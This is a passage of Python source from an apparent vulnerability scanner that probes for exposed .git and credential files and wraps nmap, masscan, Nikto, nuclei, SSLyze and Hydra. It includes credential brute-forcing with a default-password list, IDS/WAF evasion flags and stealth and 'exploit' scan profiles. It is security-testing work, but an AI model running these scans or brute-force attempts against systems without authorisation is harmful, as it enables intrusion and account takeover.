    logger.log("WHOIS-ASN", "WHOIS + ASN + cloud detection …")
    domain = get_domain(target)

    import socket as _sock, subprocess as _sp

    # Resolve IP
    try:
        ip = _sock.gethostbyname(domain)
        logger.log("WHOIS-ASN", f"IP: {ip}", "SUCCESS")
    except Exception:
        return findings

    # Cloud provider detection via IP ranges (built-in, no API key needed)
    CLOUD_RANGES = {
        "AWS":          ["3.0.","13.","15.","18.","34.","35.","52.","54.",
                         "107.20.","184.72.","204.246."],
        "Google Cloud": ["34.64.","34.65.","34.80.","34.81.","34.82.","34.83.",
                         "34.84.","34.85.","34.90.","34.91.","35.186.","35.190.",
                         "35.200.","35.201.","35.203.","35.204."],
        "Azure":        ["13.64.","13.65.","13.66.","13.67.","13.68.","13.69.",
                         "13.70.","13.71.","13.72.","13.73.","13.74.","13.75.",
                         "13.76.","13.77.","13.78.","13.79.","40.64.","40.65.",
                         "40.68.","40.70.","40.74.","40.112.","40.113.","40.114.",
                         "40.115.","40.116.","40.117.","40.118.","40.119.","40.120."],
        "Cloudflare":   ["1.1.1.","1.0.0.","104.16.","104.17.","104.18.","104.19.",
                         "104.20.","104.21.","172.64.","172.65.","172.66.","172.67.",
                         "162.158.","198.41.","190.93.","197.234.","198.41."],
        "DigitalOcean": ["64.225.","104.236.","134.122.","137.184.","138.197.",
                         "139.59.","143.198.","146.190.","157.230.","159.65.",
                         "159.203.","161.35.","165.22.","167.71.","167.172.",
                         "174.138.","178.62.","188.166.","206.189.","209.97.",
                         "209.97."],
        "Linode/Akamai":["45.33.","45.56.","45.79.","50.116.","66.175.",
                          "69.164.","72.14.","74.207.","96.126.","109.74.",
                          "172.104.","173.255.","176.58.","179.43."],
        "Hetzner":      ["5.9.","5.161.","23.88.","65.21.","78.46.","85.10.",
                          "88.198.","95.216.","116.202.","128.140.","135.181.",
                          "138.201.","144.76.","148.251.","157.90.","159.69.",
                          "162.55.","168.119.","176.9.","178.63.","188.34.",
                          "188.40.","213.133."],
    }

    cloud_provider = None
    for provider, prefixes in CLOUD_RANGES.items():
        if any(ip.startswith(pfx) for pfx in prefixes):
            cloud_provider = provider
            break

    if cloud_provider:
        logger.log("WHOIS-ASN", f"Cloud provider: {cloud_provider}", "SUCCESS")
        findings.append(make_finding("recon",
            f"Cloud Provider: {cloud_provider} ({ip})", "Info",
            f"Target IP {ip} belongs to {cloud_provider} IP ranges. "
            f"Check cloud-specific misconfigs: metadata endpoint, S3 buckets, IAM roles.",
            f"Review {cloud_provider}-specific security configurations. "
            f"Implement cloud security posture management (CSPM).",
            url=target, evidence=f"ip={ip}, provider={cloud_provider}",
            confidence="High"))

    # WHOIS via dig/whois command
    for cmd, marker in [
        (["whois", domain], ["Registrar", "Registry", "Creation Date", "Expiry Date", "Name Server"]),
        (["dig", "+short", "TXT", f"_domainkey.{domain}"], ["v=DKIM1"]),
    ]:
        try:
            result = _sp.run(cmd, capture_output=True, text=True, timeout=15)
            if result.returncode == 0 and result.stdout:
                info = {}
                for line in result.stdout.splitlines():
                    for m in marker:
                        if m.lower() in line.lower() and ":" in line:
                            k, _, v = line.partition(":")
                            info[k.strip()] = v.strip()[:80]
                if info:
                    findings.append(make_finding("recon",
                        f"WHOIS Information: {domain}", "Info",
                        f"WHOIS data: {dict(list(info.items())[:5])}",
                        "Keep WHOIS data current. Consider WHOIS privacy.",
                        url=target, evidence=str(dict(list(info.items())[:3])),
                        confidence="High"))
        except Exception:
            pass

    # ASN lookup via dig
    try:
        reversed_ip = ".".join(reversed(ip.split(".")))
        asn_result = _sp.run(
            ["dig", "+short", f"{reversed_ip}.origin.asn.cymru.com", "TXT"],
            capture_output=True, text=True, timeout=10)
        if asn_result.returncode == 0 and asn_result.stdout:
            asn_info = asn_result.stdout.strip().strip('"')
            if asn_info:
                logger.log("WHOIS-ASN", f"ASN: {asn_info[:60]}", "SUCCESS")
                findings.append(make_finding("recon",
                    f"ASN Information: {asn_info[:60]}", "Info",
                    f"Target ASN: {asn_info}. "
                    f"Useful for identifying hosting provider and network block.",
                    "Review all assets on this ASN. Check for related exposed services.",
                    url=target, evidence=f"asn={asn_info[:60]}",
                    confidence="High"))
    except Exception:
        pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# GIT HISTORY LEAKAGE — .git/logs and commit history exposure
# ─────────────────────────────────────────────────────────────────────────────
def module_git_history(target, session):
    """
    A05: Git history exposure — .git/logs/HEAD reveals commit history, 
    author emails, branch names, and may expose deleted sensitive files.
    """
    findings = []
    logger.log("GIT-HIST", "Git history leakage check …")

    GIT_PATHS = [
        (".git/logs/HEAD",           ["commit", "0000000"]),
        (".git/logs/refs/heads/main",["commit", "0000000"]),
        (".git/logs/refs/heads/master",["commit","0000000"]),
        (".git/COMMIT_EDITMSG",      []),  # Any content = leak
        (".git/config",              ["[core]", "url ="]),
        (".git/packed-refs",         ["refs/heads"]),
        (".git/refs/heads/main",     []),
        (".git/refs/heads/master",   []),
        (".git/info/refs",           []),
        (".git/objects/info/packs",  ["pack-"]),
        (".gitignore",               [".env", "*.pem", "*.key"]),
        (".git-credentials",         ["https://"]),
        (".gitconfig",               ["[user]", "email ="]),
    ]

    base = target.rstrip("/")
    for path, indicators in GIT_PATHS:
        url = f"{base}/{path}"
        try:
            r = safe_get(session, url)
            if not r or r.status_code != 200: continue
            if len(r.text) < 5: continue

            # Extract useful info
            emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", r.text)
            branches = re.findall(r"refs/heads/([^\s\n]+)", r.text)
            remote_urls = re.findall(r"url\s*=\s*(https?://[^\s]+)", r.text)

            has_indicator = (not indicators or
                             any(ind in r.text for ind in indicators))
            if not has_indicator: continue

            sev = "Critical" if "config" in path or "credentials" in path else "High"
            evidence_parts = []
            if emails: evidence_parts.append(f"emails={emails[:3]}")
            if branches: evidence_parts.append(f"branches={branches[:3]}")
            if remote_urls: evidence_parts.append(f"remotes={remote_urls[:2]}")

            logger.log("GIT-HIST", f"Git exposure: {path}", "CRITICAL")
            findings.append(make_finding("sensitive_files",
                f"Git History Exposed: {path}", sev,
                f"Git file '{path}' accessible. "
                f"{'Emails: '+str(emails[:3]) if emails else ''} "
                f"{'Branches: '+str(branches[:3]) if branches else ''} "
                f"{'Remote URLs: '+str(remote_urls[:2]) if remote_urls else ''} "
                f"Commit history may reveal deleted sensitive files.",
                "Block access to .git directory at web server level. "
                "Add 'Deny from all' for .git in Apache/.nginx. "
                "Rotate any credentials visible in history.",
                url=url, cwe="CWE-538",
                evidence=", ".join(evidence_parts) if evidence_parts else path,
                confidence="High"))
        except Exception:
            pass

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# TOOL WRAPPERS: masscan, hydra, whatweb, waymore
# ─────────────────────────────────────────────────────────────────────────────
def tool_masscan(target, workdir):
    """masscan — ultrafast port scanner (finds open ports in seconds)."""
    findings = []
    if not cmd_exists("masscan"): return findings
    domain = get_domain(target)
    logger.log("MASSCAN", f"masscan: {domain}", "TOOL")
    of = workdir / "masscan_out.txt"
    try:
        # Resolve to IP first
        import socket as _sock
        ip = _sock.gethostbyname(domain)
    except Exception:
        return findings
    run_cmd(["masscan", ip, "-p", "1-65535",
             "--rate", "10000",
             "--output-format", "list",
             "--output-filename", str(of)], timeout=180)
    if of.exists():
        try:
            for line in of.read_text(errors="ignore").splitlines():
                m = re.search(r"open tcp (\d+) (\S+)", line)
                if m:
                    port_n, host = int(m.group(1)), m.group(2)
                    cves = PORT_CVE_DB.get(port_n, [])
                    sev = "High" if cves and max(c[2] for c in cves) >= 7 else "Info"
                    cve_str = f" | CVE: {cves[0][0]} (CVSS {cves[0][2]})" if cves else ""
                    findings.append(make_finding("recon",
                        f"masscan: Port {port_n} open{cve_str}", sev,
                        f"masscan: {host}:{port_n} open.{cve_str}",
                        "Review open ports. Close unnecessary services.",
                        url=f"tcp://{host}:{port_n}", tool="masscan",
                        evidence=f"ip={ip}, port={port_n}"))
        except Exception: pass
    return findings


def tool_whatweb(target):
    """WhatWeb — web technology fingerprinter with 1800+ plugins."""
    findings = []
    if not cmd_exists("whatweb"): return findings
    logger.log("WHATWEB", f"WhatWeb: {target}", "TOOL")
    out = run_cmd(["whatweb", "--color=never", "--log-brief=/dev/stdout",
                   target], timeout=60)
    if out and out not in ("TIMEOUT","NOT_FOUND",""):
        logger.log("WHATWEB", f"Tech: {out[:100]}", "SUCCESS")
        findings.append(make_finding("recon",
            f"WhatWeb: {out[:120]}", "Info",
            f"WhatWeb detected: {out[:300]}",
            "Keep all detected technologies updated. Remove version disclosures.",
            url=target, tool="whatweb",
            evidence=out[:200]))
    return findings


def tool_hydra(target, usernames=None, passwords=None, service="http-post-form"):
    """
    Hydra — online brute force tool. Detection focus only.
    Uses DEFAULT_CREDS_DB — never runs without explicit parameters.
    """
    findings = []
    if not cmd_exists("hydra"): return findings
    domain = get_domain(target)
    logger.log("HYDRA", f"Hydra credential test: {domain}", "TOOL")

    # Write credential files
    users_file = WORK_DIR / "hydra_users.txt"
    pass_file  = WORK_DIR / "hydra_pass.txt"
    users = usernames or list(set(u for u,_ in DEFAULT_CREDS_DB[:50]))
    passwords_list = passwords or list(set(p for _,p in DEFAULT_CREDS_DB[:50]))
    users_file.write_text("\n".join(users))
    pass_file.write_text("\n".join(passwords_list))

    out = run_cmd([
        "hydra",
        "-L", str(users_file),
        "-P", str(pass_file),
        "-t", "4",               # 4 threads max
        "-f",                    # stop after first found
        "-o", str(WORK_DIR/"hydra_out.txt"),
        domain,
        service,
        f"/login:username=^USER^&password=^PASS^:Invalid",
    ], timeout=120)

    hydra_out_f = WORK_DIR / "hydra_out.txt"
    if hydra_out_f.exists():
        txt = hydra_out_f.read_text(errors="ignore")
        for m in re.finditer(r"login:\s*(\S+)\s+password:\s*(\S+)", txt, re.I):
            user, pwd = m.group(1), m.group(2)
            logger.log("HYDRA", f"Valid credentials: {user}/{pwd}", "CRITICAL")
            findings.append(make_finding("default_creds",
                f"Valid Credentials Found: {user}/{pwd}", "Critical",
                f"Hydra confirmed valid credentials: {user} / {pwd}",
                "Change credentials immediately. Enforce strong password policy. Enable MFA.",
                url=f"https://{domain}/login",
                payload=f"{user}:{pwd}", tool="hydra",
                cwe="CWE-1391", confidence="High"))

    return findings


def tool_waymore(domain, workdir):
    """Waymore — comprehensive URL discovery from multiple archive sources."""
    findings = []
    if not cmd_exists("waymore"): return []
    logger.log("WAYMORE", f"Waymore: {domain}", "TOOL")
    of = workdir / "waymore_out.txt"
    run_cmd(["waymore", "-i", domain, "-mode", "U", "-oU", str(of),
             "--timeout", "30"], timeout=180)
    if of.exists():
        try:
            urls = list(set(l.strip() for l in of.read_text(errors="ignore").splitlines()
                           if l.strip().startswith("http") and domain in l))
            logger.log("WAYMORE", f"Found {len(urls)} URLs", "SUCCESS")
            return urls
        except Exception: pass
    return []




# ═══════════════════════════════════════════════════════════════════════════════
# OBSIDIAN v10.0 — ENTERPRISE TOOL INTEGRATIONS
# All 15 tools: nmap(upgraded) + nuclei(upgraded) + nikto(upgraded) +
# sslyze(upgraded) + OpenVAS + OWASP ZAP + Nessus + Acunetix + Akto +
# ThreatMapper + Semgrep + Qualys + Burp Suite + Tenable.io + VulnVAS
# ═══════════════════════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────────────────────────────────
# NMAP v8 — 50+ NSE scripts, all scan modes, OS detection
# ─────────────────────────────────────────────────────────────────────────────

# Complete NSE script categories with purpose
NMAP_NSE_SCRIPTS = {
    # Vulnerability detection
    "vuln"       : "Known CVE detection (ms17-010, heartbleed, shellshock etc)",
    "exploit"    : "Exploit attempt scripts (safe check mode only)",
    "auth"       : "Auth bypass and default cred scripts",
    # Discovery
    "discovery"  : "Service and host discovery",
    "safe"       : "Non-intrusive safe scripts",
    "default"    : "Default nmap script set",
    # Protocol-specific
    "http-*"     : "HTTP methods, headers, enum, auth",
    "ssl-*"      : "SSL/TLS cert, cipher, POODLE, BEAST",
    "smb-*"      : "SMB shares, users, vuln (EternalBlue)",
    "ftp-*"      : "FTP anonymous, bounce, brute",
    "ssh-*"      : "SSH algos, brute, hostkey",
    "mysql-*"    : "MySQL databases, users, empty-pass",
    "ms-sql-*"   : "MSSQL databases, exec, config",
    "rdp-*"      : "RDP BlueKeep, enum-encryption",
    "dns-*"      : "DNS zone transfer, brute, cache-snoop",
    "smtp-*"     : "SMTP commands, open-relay, enum-users",
    "snmp-*"     : "SNMP community strings, sysdescr",
    "vnc-*"      : "VNC auth, info",
    "mongodb-*"  : "MongoDB databases, no-auth",
    "redis-*"    : "Redis no-auth, info",
    "elasticsearch-*": "ES indices, no-auth",
    "http-shellshock": "CVE-2014-6271 Shellshock",
    "http-log4shell": "CVE-2021-44228 Log4Shell",
}

# Individual high-value NSE scripts
NMAP_HIGH_VALUE_SCRIPTS = [
    # Critical CVEs
    "smb-vuln-ms17-010",         # EternalBlue
    "smb-vuln-cve-2020-0796",    # SMBGhost
    "smb-vuln-ms08-067",         # Conficker
    "rdp-vuln-ms12-020",         # MS12-020 RDP
    "http-shellshock",            # Shellshock CGI
    "ssl-heartbleed",             # Heartbleed
    "ssl-poodle",                 # POODLE
    "ssl-ccs-injection",          # CCS Injection CVE-2014-0224
    "ssl-dh-params",              # Logjam/FREAK weak DH
    "http-vuln-cve2014-3704",     # Drupalgeddon
    "http-vuln-cve2017-5638",     # Apache Struts2 RCE
    "http-vuln-cve2021-41773",    # Apache path traversal
    "http-vuln-log4shell",        # Log4Shell CVE-2021-44228
    # Discovery
    "http-title",                 # Page titles
    "http-headers",               # Response headers
    "http-methods",               # Allowed methods
    "http-auth-finder",           # Auth mechanisms
    "http-sitemap-generator",     # Sitemap
    "http-robots.txt",            # robots.txt
    "http-git",                   # .git exposure
    "http-config-backup",         # config backups
    "http-backup-finder",         # backup files
    "http-default-accounts",      # Default credentials
    "http-open-redirect",         # Open redirects
    "http-cors",                  # CORS misconfig
    "http-csrf",                  # CSRF issues
    "http-dombased-xss",          # DOM XSS
    "http-stored-xss",            # Stored XSS
    "http-sql-injection",         # SQLi detection
    "http-phpmyadmin-dir-traversal",
    "http-phpself-xss",
    # Service enum
    "ssh-hostkey",
    "ssh-auth-methods",
    "ftp-anon",                   # Anonymous FTP
    "ftp-bounce",
    "smtp-open-relay",
    "smtp-commands",
    "smtp-enum-users",
    "dns-zone-transfer",
    "dns-brute",
    "snmp-brute",
    "snmp-info",
    "mysql-empty-password",
    "mysql-databases",
    "ms-sql-empty-password",
    "ms-sql-config",
    "ms-sql-tables",
    "mongodb-databases",
    "redis-info",
    "memcached-info",
    "vnc-info",
    "vnc-brute",
]


def tool_nmap_v8(target, workdir, scan_mode="full"):
    """
    Nmap v8 — comprehensive scanner with 50+ NSE scripts.
    Modes: quick | full | vuln | stealth | udp | aggressive
    """
    findings = []
    if not cmd_exists("nmap"):
        logger.log("NMAP", "nmap not found — install: apt install nmap", "WARNING")
        return findings

    domain  = get_domain(target)
    out_xml = workdir / "nmap_v8.xml"
    out_txt = workdir / "nmap_v8.txt"
    out_gnm = workdir / "nmap_v8.gnmap"

    SCAN_PROFILES = {
        "quick": {
            "flags": ["-sS", "-T4", "--open", "-F",
                      "--min-rate", "2000",
                      "--script", "http-title,http-headers,http-methods,ssl-cert,ssh-hostkey,ftp-anon,smtp-commands"],
            "ports": "21,22,23,25,53,80,110,143,443,445,465,587,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017",
            "desc": "Fast common-port scan"
        },
        "full": {
            "flags": ["-sS", "-sV", "-sC", "-T4", "--open",
                      "--version-intensity", "7",
                      "--script", ",".join(NMAP_HIGH_VALUE_SCRIPTS[:25]),
                      "--script-timeout", "30s"],
            "ports": "1-65535",
            "desc": "Full port scan + version + NSE"
        },
        "vuln": {
            "flags": ["-sV", "-T4", "--open",
                      "--script", "vuln,exploit,auth,safe",
                      "--script-timeout", "60s"],
            "ports": "1-65535",
            "desc": "Full vulnerability scan"
        },
        "stealth": {
            "flags": ["-sS", "-T2", "--open",
                      "--randomize-hosts", "--data-length", "15",
                      "--script", "http-title,ssl-cert"],
            "ports": "80,443,8080,8443",
            "desc": "Slow stealth scan"
        },
        "aggressive": {
            "flags": ["-A", "-T4", "--open",
                      "-O",                   # OS detection
                      "--traceroute",
                      "--script", ",".join(NMAP_HIGH_VALUE_SCRIPTS),
                      "--script-timeout", "90s"],
            "ports": "1-65535",
            "desc": "Aggressive with OS detection"
        },
        "udp": {
            "flags": ["-sU", "-T4", "--open",
                      "--script", "snmp-info,snmp-brute,dns-recursion,ntp-info,tftp-enum"],
            "ports": "53,67,68,69,123,137,138,161,162,500,514,520,1900",
            "desc": "UDP service scan"
        },
    }

    profile = SCAN_PROFILES.get(scan_mode, SCAN_PROFILES["full"])
    logger.log("NMAP", f"[{scan_mode.upper()}] {profile['desc']}: {domain}", "TOOL")

    cmd = (
        ["nmap"] +
        profile["flags"] +
        ["-p",     profile["ports"],
         "-oX",    str(out_xml),
         "-oN",    str(out_txt),
         "-oG",    str(out_gnm),
         "--reason",        # show reason for each port state
         domain]
    )

    run_cmd(cmd, timeout=900)

    if not out_xml.exists():
        logger.log("NMAP", "No output — possible network issue", "WARNING")
        return findings

    try:
        import xml.etree.ElementTree as ET
        tree = ET.parse(str(out_xml))
        root = tree.getroot()

        # Extract OS detection
        for host in root.findall("host"):
            # OS detection
            os_el = host.find(".//osmatch")
            if os_el is not None:
                os_name    = os_el.get("name", "")
                os_acc     = os_el.get("accuracy", "")
                os_classes = host.findall(".//osclass")
                os_family  = os_classes[0].get("osfamily","") if os_classes else ""
                logger.log("NMAP", f"OS: {os_name} ({os_acc}% accuracy)", "SUCCESS")
                findings.append(make_finding("recon",
                    f"OS Detected: {os_name}", "Info",
                    f"nmap OS detection: {os_name} (accuracy {os_acc}%). "
                    f"Family: {os_family}.",
                    "Ensure OS is patched. Check OS-specific CVEs.",
                    url=f"tcp://{domain}", tool="nmap",
                    evidence=f"os={os_name}, acc={os_acc}%, family={os_family}"))

            for port_el in host.findall(".//port"):
                port_id  = int(port_el.get("portid", 0))
                proto    = port_el.get("protocol", "tcp")
                state_el = port_el.find("state")
                if state_el is None or state_el.get("state") != "open":
                    continue

                reason   = state_el.get("reason","")
                svc      = port_el.find("service")
                svc_name = svc.get("name","?")      if svc is not None else "?"
                svc_prod = svc.get("product","")    if svc is not None else ""
                svc_ver  = svc.get("version","")    if svc is not None else ""
                svc_cpe  = svc.get("extrainfo","")  if svc is not None else ""
                cpe_els  = port_el.findall(".//cpe")
                cpe_str  = ", ".join(c.text for c in cpe_els if c.text) if cpe_els else ""
                full_svc = f"{svc_prod} {svc_ver}".strip()

                # CVE cross-reference
                cves = PORT_CVE_DB.get(port_id, [])
                cve_note = ""
                max_cvss = 0
                if cves:
                    top = max(cves, key=lambda x: x[2])
                    cve_note = f" | CVE: {top[0]} (CVSS {top[2]})"
                    max_cvss = max(c[2] for c in cves)

                sev = ("Critical" if max_cvss >= 9.0
                       else "High"   if max_cvss >= 7.0 or port_id in (21,23,25,110,143,3389,5900)
                       else "Medium" if max_cvss >= 4.0
                       else "Info")

                score, vector, _ = CVSS31.for_module("recon")
                findings.append(make_finding("recon",
                    f"nmap [{scan_mode}]: {svc_name}/{proto} port {port_id}" +
                    (f" ({full_svc})" if full_svc else ""),
                    sev,
                    f"Port {port_id}/{proto} open. Service: {full_svc or svc_name}. "
                    f"Reason: {reason}.{cve_note}"
                    + (f" CPE: {cpe_str}" if cpe_str else ""),
                    "Restrict access. Patch to latest version. Disable if unused.",
                    url=f"tcp://{domain}:{port_id}",
                    tool="nmap", evidence=f"svc={full_svc}, cvss={score}, cpe={cpe_str[:60]}",
                    cwe="CWE-200", confidence="High"))

                # NSE script output
                for script in port_el.findall("script"):
                    s_id  = script.get("id","")
                    s_out = script.get("output","").strip()
                    if not s_out: continue

                    VULN_WORDS = ["VULNERABLE","CVE-","EXPLOITABLE","State: VULNERABLE",
                                  "risk factor: HIGH","LIKELY VULNERABLE","DETECTED"]
                    is_vuln = any(w in s_out for w in VULN_WORDS)
                    if not is_vuln and "vuln" not in s_id.lower(): continue

                    cves_found = re.findall(r"CVE-\d{4}-\d+", s_out)
                    cvss_m = re.search(r"CVSS:\s*(\d+\.?\d*)", s_out, re.I)
                    nse_cvss = float(cvss_m.group(1)) if cvss_m else 7.5
                    nse_sev  = ("Critical" if nse_cvss >= 9.0 else
                                "High"   if nse_cvss >= 7.0 else "Medium")

                    logger.log("NMAP", f"NSE [{s_id}] port {port_id}: VULNERABLE", "CRITICAL")
                    findings.append(make_finding("recon",
                        f"NSE [{s_id}] VULNERABLE — port {port_id}", nse_sev,
                        f"NSE script '{s_id}' flagged port {port_id} as vulnerable. "
                        f"CVEs: {', '.join(cves_found) or 'none extracted'}. "
                        f"Output: {s_out[:400]}",
                        "Apply vendor patch immediately. Validate with manual testing.",
                        url=f"tcp://{domain}:{port_id}",
                        tool="nmap", payload=s_id,
                        cwe=cves_found[0] if cves_found else "CWE-1035",
                        evidence=f"nse_cvss={nse_cvss}, cves={cves_found[:3]}, output={s_out[:100]}",
                        confidence="High"))

    except Exception as e:
        logger.log("NMAP", f"XML parse error: {e}", "ERROR")
        # Fallback: grep text output
        if out_txt.exists():
            txt = out_txt.read_text(errors="ignore")
            for cve in set(re.findall(r"CVE-\d{4}-\d+", txt)):
                findings.append(make_finding("recon",
                    f"nmap CVE: {cve}", "High",
                    f"nmap scan references {cve}.",
                    "Investigate and apply patch.",
                    url=f"tcp://{domain}", tool="nmap", cwe=cve))

    logger.log("NMAP", f"v8 scan complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# NUCLEI v8 — fuzzing, custom templates, DAST mode
# ─────────────────────────────────────────────────────────────────────────────
def tool_nuclei_v8(targets, workdir, custom_templates_dir=None):
    """
    Nuclei v8 — upgraded with fuzzing, severity filtering, custom templates.
    Uses host-spray strategy for efficiency.
    """
    findings = []
    if not find_bin("nuclei"): return findings
    logger.log("NUCLEI", f"Nuclei v8: {len(targets)} targets", "TOOL")

    tf      = workdir / "nuclei_targets.txt"
    out_json= workdir / "nuclei_out.jsonl"
    tf.write_text("\n".join(targets))

    # Update templates
    for flag in ["-update", "-update-templates"]:
        try:
            subprocess.run(["nuclei", flag],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=60, env={**os.environ,"PATH":_EXT_PATH})
            break
        except Exception: pass

    cmd = [
        "nuclei",
        "-l",              str(tf),
        "-severity",       "critical,high,medium",
        "-o",              str(out_json),
        "-jsonl",                        # JSON Lines output for parsing
        "-silent",
        "-nc",
        "-no-color",
        "-timeout",        "10",
        "-retries",        "1",
        "-rate-limit",     "50",
        "-bulk-size",      "25",
        "-concurrency",    "10",
        "-scan-strategy",  "host-spray", # per-host strategy (reduces duplication)
        "-stats",
        "-fuzz",                         # enable fuzzing mode (Nuclei v3.1+)
        "-dast",                         # DAST mode — dynamic testing
        "-validate",                     # validate templates before running
    ]

    # Custom templates
    if custom_templates_dir and Path(custom_templates_dir).exists():
        cmd += ["-t", custom_templates_dir]
        logger.log("NUCLEI", f"Using custom templates: {custom_templates_dir}", "INFO")

    # Template tags to skip (reduce noise / FP)
    cmd += ["-etags", "dos,info,misc"]

    run_cmd(cmd, timeout=900)

    seen   = set()
    SEV_MAP= {"critical":"Critical","high":"High","medium":"Medium",
               "low":"Low","info":"Info"}

    if out_json.exists():
        for line in out_json.read_text(errors="ignore").splitlines():
            if not line.strip(): continue
            try:
                d       = json.loads(line)
                tmpl_id = d.get("template-id","")
                url     = d.get("matched-at", d.get("url", targets[0] if targets else ""))
                sev_raw = d.get("info",{}).get("severity","medium")
                sev     = SEV_MAP.get(sev_raw.lower(),"Medium")
                name    = d.get("info",{}).get("name", tmpl_id)
                desc    = d.get("info",{}).get("description","")
                ref     = d.get("info",{}).get("reference",[""])[0] if d.get("info",{}).get("reference") else ""
                cve_ids = d.get("info",{}).get("classification",{}).get("cve-id",[])
                cvss_sc = d.get("info",{}).get("classification",{}).get("cvss-score","")
                curl_cmd= d.get("curl-command","")
                matcher = d.get("matcher-name","")
                extract = d.get("extracted-results",[])

                if sev == "Info": continue

                dedup = f"{tmpl_id}:{url}"
                if dedup in seen: continue
                seen.add(dedup)

                logger.log("NUCLEI",
                    f"[{sev}] {tmpl_id} @ {url[:50]}", "CRITICAL" if sev in ("Critical","High") else "WARNING")
                findings.append(make_finding("info_disclosure",
                    f"Nuclei [{tmpl_id}]: {name}", sev,
                    f"{desc or name}. Template: {tmpl_id}. "
                    f"{'CVEs: '+', '.join(cve_ids) if cve_ids else ''} "
                    f"{'CVSS: '+str(cvss_sc) if cvss_sc else ''} "
                    f"{'Matcher: '+matcher if matcher else ''} "
                    f"{'Extracted: '+str(extract[:2]) if extract else ''}".strip(),
                    f"Review {ref or 'Nuclei template docs'} for remediation.",
                    url=url, tool="nuclei",
                    evidence=f"tmpl={tmpl_id}, curl={curl_cmd[:80]}",
                    payload=curl_cmd[:120] if curl_cmd else "",
                    cwe=cve_ids[0] if cve_ids else ""))
            except Exception: pass

    logger.log("NUCLEI", f"v8 complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# NIKTO v8 — all plugins, mutation, output parsing
# ─────────────────────────────────────────────────────────────────────────────
def tool_nikto_v8(target, workdir):
    """Nikto v8 — full plugin set, mutation testing, structured output parsing."""
    findings = []
    if not find_bin("nikto"): return findings
    domain = get_domain(target)
    logger.log("NIKTO", f"Nikto v8 full scan: {target}", "TOOL")

    out_xml = workdir / "nikto_v8.xml"
    out_txt = workdir / "nikto_v8.txt"

    run_cmd([
        "nikto",
        "-h",       target,
        "-o",       str(out_xml),
        "-Format",  "xml",
        "-Plugins", "ALL",          # all plugins
        "-Tuning",  "x6789abc",     # all test categories
        "-mutate",  "1234",         # mutation testing (paths/methods/headers/params)
        "-C",       "all",          # check all CGI dirs
        "-evasion", "1",            # IDS/WAF evasion technique 1
        "-ssl",                     # force SSL testing
        "-timeout", "10",
        "-maxtime", "600",          # max 10 minutes
        "-nointeractive",
    ], timeout=650)

    # Parse XML
    try:
        if out_xml.exists():
            import xml.etree.ElementTree as ET
            tree = ET.parse(str(out_xml))
            root = tree.getroot()
            for item in root.findall(".//item"):
                desc = item.findtext("description","")
                uri  = item.findtext("uri","")
                osvdb= item.findtext("osvdbid","")
                osvdb_link = item.findtext("osvdblink","")
                method = item.findtext("method","GET")

                if not desc: continue
                # Severity heuristic from keywords
                sev = ("Critical" if any(w in desc.lower() for w in
                                         ["rce","remote code","command injection","shell"])
                       else "High" if any(w in desc.lower() for w in
                                          ["sql injection","xss","path traversal","directory traversal",
                                           "authentication bypass","default password","backdoor"])
                       else "Medium" if any(w in desc.lower() for w in
                                             ["information disclosure","config","backup","version"])
                       else "Low")
                url  = urljoin(target, uri) if uri else target
                findings.append(make_finding("sensitive_files",
                    f"Nikto: {desc[:70]}", sev,
                    f"Nikto detected: {desc}. URI: {uri}. Method: {method}. "
                    + (f"OSVDB: {osvdb}" if osvdb else ""),
                    "Investigate and remediate each Nikto finding.",
                    url=url, tool="nikto",
                    evidence=f"osvdb={osvdb}, link={osvdb_link[:60]}"))
    except Exception:
        # Fallback: run again with text output
        run_cmd(["nikto","-h",target,"-o",str(out_txt),"-Format","txt",
                 "-Plugins","ALL","-nointeractive","-timeout","10","-maxtime","300"],
                timeout=350)
        if out_txt.exists():
            for line in out_txt.read_text(errors="ignore").splitlines():
                if line.startswith("+") and len(line) > 10:
                    sev = ("High" if any(w in line.lower() for w in
                                         ["sql","xss","injection","traversal","default"])
                           else "Low")
                    findings.append(make_finding("sensitive_files",
                        f"Nikto: {line[2:75]}", sev,
                        line.strip(), "Investigate and remediate.",
                        url=target, tool="nikto"))

    logger.log("NIKTO", f"v8 complete — {len(findings)} findings", "SUCCESS")
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# SSLyze v8 — JSON output, full cipher analysis, certificate chain
# ─────────────────────────────────────────────────────────────────────────────
def tool_sslyze_v8(target, workdir):
    """SSLyze v8 — JSON-mode full cipher suite + cert chain analysis."""
    findings = []
    if not find_bin("sslyze"): return findings
    if not target.startswith("https://"): return findings
    domain = get_domain(target)
    logger.log("SSLYZE", f"SSLyze v8: {domain}", "TOOL")

    out_json = workdir / "sslyze_v8.json"

    run_cmd([
        "sslyze",
        "--json_out", str(out_json),
        "--regular",                     # all regular checks
        "--certinfo",                    # cert chain info
        "--early_data",                  # early data (0-RTT) check
        "--heartbleed",                  # Heartbleed
        "--openssl_ccs",                 # OpenSSL CCS injection
        "--fallback",                    # TLS_FALLBACK_SCSV
        "--renegotiation",               # insecure renegotiation
        "--sslv2",                       # SSLv2 support
        "--sslv3",                       # SSLv3 support (POODLE)
        "--tlsv1",                       # TLSv1.0 support (deprecated)
        "--tlsv1_1",                     # TLSv1.1 (deprecated)
        "--tlsv1_2",                     # TLSv1.2 (baseline)
        "--tlsv1_3",                     # TLSv1.3 (good)
        "--robot",                       # ROBOT attack (RSA key exchange)
        domain,
    ], timeout=120)

    WEAK_CIPHERS = [
        "RC4", "DES", "3DES", "NULL", "EXPORT", "ANON", "MD5",
        "RC2", "SEED", "IDEA", "PSK", "SRP",
    ]
    WEAK_PROTOCOLS = {"SSLv2", "SSLv3", "TLSv1.0", "TLSv1.1"}

    if out_json.exists():
        try:
            data = json.loads(out_json.read_text(errors="ignore"))
            for server in data.get("server_scan_results", []):
                hostname = server.get("server_location",{}).get("hostname", domain)
                scan_res = server.get("scan_result", {})

                # Certificate analysis
                certinfo = scan_res.get("certificate_info",{}).get("result",{})
                cert_chain= certinfo.get("certificate_deployments",[{}])
                if cert_chain:
